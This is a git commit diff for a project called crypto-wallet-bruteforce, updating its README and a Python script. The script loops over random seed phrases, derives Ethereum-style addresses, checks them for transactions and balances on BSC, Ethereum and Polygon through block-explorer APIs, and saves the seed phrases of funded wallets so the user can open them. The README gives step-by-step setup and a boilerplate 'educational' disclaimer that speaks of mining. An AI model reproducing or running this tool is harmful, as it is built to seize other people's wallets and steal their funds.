083c6c6b0a555be13eb3a16d308ace9d7d9c1858
niyankhadka <niyankhadka.nk@gmail.com>
2023-11-12 19:41:23 +0545

    v1.0.0 release and bugs fixed

--- README.md
+++ README.md
@@ -1,93 +1,145 @@
 # crypto-wallet-bruteforce
 
-Python based crypto wallet bruteforce script which is for educational purposes only. Use this script at your own risk. 
+`crypto-wallet-bruteforce` is a tool for brute forcing crypto wallets
 
-Script Requirements
+## **Disclaimer**
 
-    Here are the requirements that needs to be available before starting. 
-    
-    1. Very good internet connection and device (4/8GB RAM)
-    2. Python Program available/insalled on machine
-    3. GitHub (optional)
-    4. Text Editor (VSCode, I preferred)
-    5. BscScan API
-    6. EtherScan API
-    7. PolygonScan API
+This script is developed for educational and research purposes only.
 
-Getting Started:
+**By using this code, you agree to the following:**
 
-    All you need is very good internet connection and few python libraries to be installed at the running device.
+1. You will not use this code, in whole or in part, for malicious intent, including but not limited to unauthorized mining on third-party systems.
+2. You will seek explicit permission from any and all system owners before running or deploying this code.
+3. You understand the implications of running mining software on hardware, including the potential for increased wear and power consumption.
+4. The creator of this script cannot and will not be held responsible for any damages, repercussions, or any negative outcomes that result from using this script.
 
-    Follow the below steps one by one if you are starting from scratch. For already experienced people, you know it. Just skip few steps and have a short glace at it.
+If you do not agree to these terms, please do not use or distribute this code.
 
-    Let's get set go.........
+# **Requirements**
 
-    1. Install Python from official link (nake sure to use latest version)
-    Link: https://www.python.org/
+**Here are the requirements that needs to be available before starting.**
 
-    2. After installation, download the crypto-wallet-bruteforce package as zip file. 
-    Always look for latest release and use it.
-    Link: https://github.com/niyankhadka/crypto-wallet-bruteforce/releases
+1. Very good internet connection and device (4/8GB RAM)
+2. Python Program available/insalled on machine
+3. GitHub (optional)
+4. Text Editor (VSCode, I preferred)
+5. BscScan API
+6. EtherScan API
+7. PolygonScan API
 
-    3. Unzip the file to your favourite drive folder.
-        There are few steps that need to be done. Don't worry, explore more steps below.
+# **Getting Started**
 
-    4. Create or login account to the following blockchain explorer
+All you need is very good internet connection and few python libraries to be installed at the running device.
 
-        a. BscScan API
-        Link: https://bscscan.com/
-        b. EtherScan API
-        Link: https://etherscan.io/
-        c. PolygonScan API
-        Link: https://polygonscan.com/
+Follow the below steps one by one if you are starting from scratch. For already experienced people, you know it. Just skip few steps and have a short glace at it.
 
-    After creating or logging on acccounts on them, go to api keys where it can be seen from left side of your dashboard or from your profile menu. 
-    Create new api keys for respective blockchain explorer. You can give 'Test' or any name you want as App Name.
+**Let's go.........**
 
-    5. After creating accounts, get back to folder where you have save this file.
+1. **Install Python from official link** (make sure to use latest version)
+```
+https://www.python.org/
+```
 
-        a. Go to crypto-wallet-bruteforce/python 
-        b. Open config.ini file
-        c. Paste the copied API keys on respective name there.
+2. After installation of python, clone the **crypto-wallet-bruteforce** using: 
+```
+git clone https://github.com/niyankhadka/crypto-wallet-bruteforce.git
+```
 
-    6. Now it's time to install the python libraries that needed to be installed to run the script. Just hang on, this one is the final setup process. Will try to make setup process easier on updates. You can install those from command line, text editor or Windows PowerShell.
+`Note: Always look for latest release and use it.`
+```
+https://github.com/niyankhadka/crypto-wallet-bruteforce/releases
+```
 
-    Copy and run following codes one by one:
+3. Go to the path you have clone the repository and hang on!
+There are few steps that need to be done. Don't worry, explore more steps below.
 
-        a. pip install requests
-        b. pip install hdwallet
+4. Create or login account to the following blockchain explorer and obtain API keys.
 
-    Alright, initial setup process is completed. Now, we are ready to run the script.
+a. **BscScan API** [Instruction Here](https://docs.bscscan.com/getting-started/viewing-api-usage-statistics)
+```
+https://bscscan.com/
+```
+b. **EtherScan API** [Instruction Here](https://docs.etherscan.io/getting-started/viewing-api-usage-statistics)
+```
+https://etherscan.io/
+```
+c. **PolygonScan API** [Instruction Here](https://docs.polygonscan.com/getting-started/viewing-api-usage-statistics)
+```
+https://polygonscan.com/
+```
 
-Run Script:
+**Make sure to follow instuctions from the above links if you are new with the platform.**
 
-    To run this script on this version, navigate to 'cd crypto-wallet-bruteforce\python\' and make sure you are on right path. 
-    Type 'python run.py' and hit enter. 
+5. After creating accounts, get back to folder where you were left from the `Step 3``.
+```
+a. Go to crypto-wallet-bruteforce/python 
+b. Open config.ini file
+c. Paste the copied API keys on respective name there.
+```
 
-    Now, the script will start to run and will display the updates on the screen. 
+6. Now it's time to install the python libraries that needed to be installed to run the script. Just hang on, this one is the final setup process. Will try to make setup process easier on updates. You can install those from command line, text editor or Windows PowerShell.
 
-Check Successful Wallets:
+Copy and run following codes one by one:
+```
+pip install requests
+```
+```
+pip install hdwallet
+```
 
-    Navigate to crypto-wallet-bruteforce\python\hasBalance\ folder. There you can see all the wallets details which has amount on it. 
+Alright, initial setup process is completed. Now, we are ready to run the script.
 
-Limitations:
+# Execution
 
-    1. API Keys are available on free and pro so, based on it, it depends upon how many scripts you want to run for this bruteforce process.
-    2. For now, bsc, eth and matic is only supported. For other crypto currencies network, will update later on.
-    3. It is the initial version of the script so, somewhere there might be missing or issue. If you are interested to contribute, we are open and really appreciated.
+To run this script on this version, run crypto-wallet-bruteforce from the command line:
+```
+cd crypto-wallet-bruteforce\python\ 
+```
+`Make sure you are on right path. Then type:`
+```
+python run.py
+```
 
-Thank Note:
+Now, the script will start to run and will display the updates on the screen.
 
-    Thanks to https://github.com/meherett/python-hdwallet for the awesome python library you have created.
+## Updates
 
-Contribution:
+- V1.0.0
+`crypto-wallet-bruteforce` now supports detection having Balance and Transaction(s) of bsc, eth and polygon network.
 
-    Feel free to open an issue if you find a problem, or a pull request if you've solved an issue. And also any help in testing, development, documentation and other tasks is highly appreciated and useful to the project.
+# How to open the discovered wallet?
 
-Donations:
+## Check Successful Wallets
 
-    If You found this tool helpful consider making a donation, kindly contact me. (Will provide details on updates further)
+### Wallets having Balance
 
-License:
-    This project is under GPL-3.0 license. 
-    Link: https://github.com/niyankhadka/crypto-wallet-bruteforce/blob/main/LICENSE
+Navigate to `crypto-wallet-bruteforce\python\hasBalance\` folder. There you can see all the wallets details which has amount on it. 
+
+### Wallets having Transaction(s)
+
+Navigate to `crypto-wallet-bruteforce\python\hasTransaction\` folder. There you can see all the wallets details which has transaction(s) on it. 
+
+## Limitations
+
+1. API Keys are available on free and pro so, based on it, it depends upon how many scripts you want to run for this bruteforce process.
+2. For now, bsc, eth and matic is only supported. For other crypto currencies network, will update later on.
+3. It is the initial version of the script so, somewhere there might be missing or issue. If you are interested to contribute, we are open and really appreciated.
+
+# Contribution
+
+Feel free to open an issue if you find a problem, or a pull request if you've solved an issue. And also any help in testing, development, documentation and other tasks is highly appreciated and useful to the project.
+
+## Donations
+
+If You found this tool helpful consider making a donation, kindly contact me. [niyankhadka.nk@gmail.com](mailto:niyankhadka.nk@gmail.com)
+
+## License
+This project is under GPL-3.0 license. 
+```
+https://github.com/niyankhadka/crypto-wallet-bruteforce/blob/main/LICENSE
+```
+## Thank Note
+
+Thanks to **https://github.com/meherett/python-hdwallet** for the awesome python library you have created.
+
+`Star and watch the repo for updates, and your support is greatly appreciated!`
--- python/run.py
+++ python/run.py
@@ -4,38 +4,60 @@
 
 import os
 import configparser
-import json
 import time
-from datetime import date
-import requests as req # pip install requests
+import datetime
+import requests # pip install requests
 from hdwallet import BIP44HDWallet # pip install hdwallet
 from hdwallet.cryptocurrencies import EthereumMainnet
 from hdwallet.derivations import BIP44Derivation
 from hdwallet.utils import generate_mnemonic
-from typing import Optional 
+from typing import Optional
 
-# read config file
-config = configparser.ConfigParser()
-config.read('config.ini')
+def check_connection():
 
-check_mainnet = ['bsc', 'eth', 'matic']
+    url='https://www.google.com/'
+    try:
+        requests.get( url, timeout = 10 )
+        return True
+    except requests.exceptions.HTTPError as errh:
+        # print ( "Http Error:", errh )
+        return False
+    except requests.exceptions.ConnectionError as errc:
+        # print ( "Error Connecting:", errc )
+        return False
+    except requests.exceptions.Timeout as errt:
+        # print ( "Timeout Error:", errt )
+        return False
+    except requests.exceptions.RequestException as err:
+        # print ( "OOps: Something Else", err )
+        return False
+    except Exception as e:
+        time.sleep(5)
+        return False
 
 def mainnet_url( mainnet ):
+
     if mainnet == "bsc":
         mainnet_url = "https://api.bscscan.com/"
     elif mainnet == "eth":
         mainnet_url = "https://api.etherscan.io/"
-    elif mainnet == "matic":
+    elif mainnet == "polygon":
         mainnet_url = "https://api.polygonscan.com/"
     else:
         mainnet_url = "https://api.bscscan.com/"
     return mainnet_url
 
 def mainnet_api( mainnet ):
+
+    # read config file
+    config = configparser.ConfigParser()
+    config.read('config.ini')
+
     mainnet_api = config['api'][mainnet]
     return mainnet_api
 
 def req_trnx( mainnet, address ):
+
     mainnet_url_link = mainnet_url( mainnet )
     mainnet_api_key = mainnet_api( mainnet )
     module = "account"
@@ -43,78 +65,107 @@ def req_trnx( mainnet, address ):
     page_no = 1
     display_per_page = 1
     sort = "desc"
-    trnx_response = req.get(f"{mainnet_url_link}api?module={module}&action={action}&address={address}&page={page_no}&offset={display_per_page}&sort={sort}&apikey={mainnet_api_key}", timeout = None)
-    if trnx_response:
-        trnx_info = trnx_response.json()
-        return trnx_info
-    
+    connection_count = 1
+    while True:
+        if check_connection() is True:
+            trnx_response = requests.get(f"{mainnet_url_link}api?module={module}&action={action}&address={address}&page={page_no}&offset={display_per_page}&sort={sort}&apikey={mainnet_api_key}", timeout = None)
+            if trnx_response:
+                trnx_info = trnx_response.json()
+                return trnx_info
+            break
+        else:
+            print(f"-------->>> Trying to establish a connection!!! || Checked: {connection_count} time(s) <<<--------\n")
+            time.sleep(10)
+            connection_count+= 1
+            os.system('cls')
+            pass
+            
 def req_balance( mainnet, address ):
+
     mainnet_url_link = mainnet_url( mainnet )
     mainnet_api_key = mainnet_api( mainnet )
     module = "account"
     action = "balance"
-    balance_response = req.get(f"{mainnet_url_link}api?module={module}&action={action}&address={address}&apikey={mainnet_api_key}", timeout = None)
-    if balance_response:
-        balance_info = balance_response.json()
-        return balance_info
+    connection_count = 1
+    while True:
+        if check_connection() is True:
+            balance_response = requests.get(f"{mainnet_url_link}api?module={module}&action={action}&address={address}&apikey={mainnet_api_key}", timeout = None)
+            if balance_response:
+                balance_info = balance_response.json()
+                return balance_info
+            break
+        else:
+            print(f"-------->>> Trying to establish a connection!!! || Checked: {connection_count} time(s) <<<--------\n")
+            time.sleep(10)
+            connection_count+= 1
+            os.system('cls')
+            pass
 
-# path of the directory
-hasBalancePath = "hasBalance"
+def main():
 
-# creating the date object of today's date
-todays_date = date.today()
+    os.system('cls')
+    # list of mainnet to check
+    check_mainnet = ['bsc', 'eth', 'polygon']
 
-looper_count = 0
-fount_count = 0
-looper = True
-while looper:
+    # path of the directory
+    hasTransactionPath = "hasTransaction"
+    hasBalancePath = "hasBalance"
 
-    print(f"Total Checked: {looper_count} || Found: {fount_count}")
+    # creating the date object of today's date
+    todays_date = datetime.date.today()
 
-    # Generate english mnemonic words
-    MNEMONIC: str = generate_mnemonic(language="english", strength=128)
-    # Secret passphrase/password for mnemonic
-    PASSPHRASE: Optional[str] = None
+    looper_count = 0
+    balanceFound_count = 0
+    trnxFound_count = 0
+    init_run_time = time.monotonic()
+    run_time = 0
+    execution_time = 0
+    looper = True
+    while looper:
 
-    # Initialize Ethereum mainnet BIP44HDWallet
-    bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
-    # Get Ethereum BIP44HDWallet from mnemonic
-    bip44_hdwallet.from_mnemonic(
-        mnemonic=MNEMONIC, language="english", passphrase=PASSPHRASE
-    )
-    # Clean default BIP44 derivation indexes/paths
-    bip44_hdwallet.clean_derivation()
+        start_time = time.monotonic()
 
-    print("Checking Mnemonic:", bip44_hdwallet.mnemonic())
+        print(f"Total Checked: {looper_count} || Execution Per Time: {execution_time} || Elapsed Time: {run_time}")
+        print(f"Transaction Found: {trnxFound_count} || Balance Found: {balanceFound_count}")
 
-    # Get Ethereum BIP44HDWallet information's from address index
-    for address_index in range(1):
-        # Derivation from Ethereum BIP44 derivation path
-        bip44_derivation: BIP44Derivation = BIP44Derivation(
-            cryptocurrency=EthereumMainnet, account=0, change=False, address=address_index
+        # Generate english mnemonic words
+        MNEMONIC: str = generate_mnemonic(language="english", strength=128)
+        # Secret passphrase/password for mnemonic
+        PASSPHRASE: Optional[str] = None
+
+        # Initialize Ethereum mainnet BIP44HDWallet
+        bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
+        # Get Ethereum BIP44HDWallet from mnemonic
+        bip44_hdwallet.from_mnemonic(
+            mnemonic=MNEMONIC, language="english", passphrase=PASSPHRASE
         )
-        # Drive Ethereum BIP44HDWallet
-        bip44_hdwallet.from_path(path=bip44_derivation)
-        # Print address_index, path, address and private_key
-        # print(f"{bip44_hdwallet.address()} 0x{bip44_hdwallet.private_key()}")
-        # Clean derivation indexes/paths
-        bip44_hdwallet.clean_derivation()
+        # Clean default BIP44 derivation indexes/paths
+        # bip44_hdwallet.clean_derivation()
 
-        print(f"Wallet Address: {bip44_hdwallet.address()}" )
+        print("Checking Mnemonic:", bip44_hdwallet.mnemonic())
 
-        for mainnet in check_mainnet:
-            wallet_trnx_status = req_trnx( mainnet, bip44_hdwallet.address() )
-            print(f"---- Checking Transaction(s) on {mainnet}")
-            if wallet_trnx_status["status"] == "1":
-                print(f"-------- Checking Balance on {mainnet}")
-                wallet_trnx_balance = req_balance( mainnet, bip44_hdwallet.address() )
-                if wallet_trnx_balance["result"] != "0":
-                    fount_count+= 1
-                    print(f"************ Found Balance on {mainnet}")
-                    with open(r"{}\hasBalance-{}.txt".format(hasBalancePath, todays_date), "a") as hb:
+        # Get Ethereum BIP44HDWallet information's from address index
+        for address_index in range(1):
+            # Derivation from Ethereum BIP44 derivation path
+            bip44_derivation: BIP44Derivation = BIP44Derivation(
+                cryptocurrency=EthereumMainnet, account=0, change=False, address=address_index
+            )
+            # Drive Ethereum BIP44HDWallet
+            bip44_hdwallet.from_path(path=bip44_derivation)
+            # Print address_index, path, address and private_key
+            # print(f"{bip44_hdwallet.address()} 0x{bip44_hdwallet.private_key()}")
+
+            print(f"Wallet Address: {bip44_hdwallet.address()}" )
+
+            for mainnet in check_mainnet:
+                wallet_trnx_status = req_trnx( mainnet, bip44_hdwallet.address() )
+                print(f"---->>> Checking Transaction(s) on {mainnet}")
+                if wallet_trnx_status["status"] == "1":
+                    trnxFound_count+= 1
+                    print(f"************ Found Transaction on {mainnet}")
+                    with open(r"{}\hasTransaction-{}.txt".format(hasTransactionPath, todays_date), "a") as hb:
                         hb.write( mainnet )
                         hb.write( " - " )
-                        hb.write( wallet_trnx_balance["result"] )
                         hb.write( " || Mnemonic : " )
                         hb.write( bip44_hdwallet.mnemonic() )
                         hb.write( " || " )
@@ -122,10 +173,35 @@ while looper:
                         hb.write( " " )
                         hb.write( '\n' )
                         hb.close()
-                else :
-                    print(f"xxxxxxxx Not Found Balance on {mainnet}")
-            else:
-                print(f"xxxxxxxx No Transactions Found on {mainnet}")
+                    print(f"-------->>> Checking Balance on {mainnet}")
+                    wallet_trnx_balance = req_balance( mainnet, bip44_hdwallet.address() )
+                    if wallet_trnx_balance["result"] != "0":
+                        balanceFound_count+= 1
+                        print(f"************ Found Balance on {mainnet}")
+                        with open(r"{}\hasBalance-{}.txt".format(hasBalancePath, todays_date), "a") as hb:
+                            hb.write( mainnet )
+                            hb.write( " - " )
+                            hb.write( wallet_trnx_balance["result"] )
+                            hb.write( " || Mnemonic : " )
+                            hb.write( bip44_hdwallet.mnemonic() )
+                            hb.write( " || " )
+                            hb.write( bip44_hdwallet.address() )
+                            hb.write( " " )
+                            hb.write( '\n' )
+                            hb.close()
+                    else :
+                        print(f"xxxxxxxx Not Found Balance on {mainnet}")
+                else:
+                    print(f"xxxxxxxx No Transactions Found on {mainnet}")
+            
+        looper_count+= 1
+        end_time = time.monotonic()
+        execution_time = datetime.timedelta(seconds=end_time - start_time)
+        run_time = datetime.timedelta(seconds=end_time - init_run_time)
+        # Clean derivation indexes/paths
+        bip44_hdwallet.clean_derivation()
+        os.system('cls')
+
+if __name__ == '__main__':
         
-    looper_count+= 1
-    os.system('cls')
+    main()
